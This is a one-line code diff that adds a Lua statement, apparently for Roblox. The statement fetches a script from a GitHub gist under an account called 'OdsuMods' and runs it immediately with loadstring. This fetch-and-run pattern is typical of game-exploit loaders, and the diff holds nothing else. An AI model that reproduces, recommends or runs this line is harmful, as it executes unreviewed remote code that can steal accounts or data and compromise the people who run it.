@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://gist.githubusercontent.com/OdsuMods/94c0ef4af63283d7e396ab32ae1ebc3b/raw/6b9a111cc5870a1e1752b1dd75338ca99c335f1d/')))()
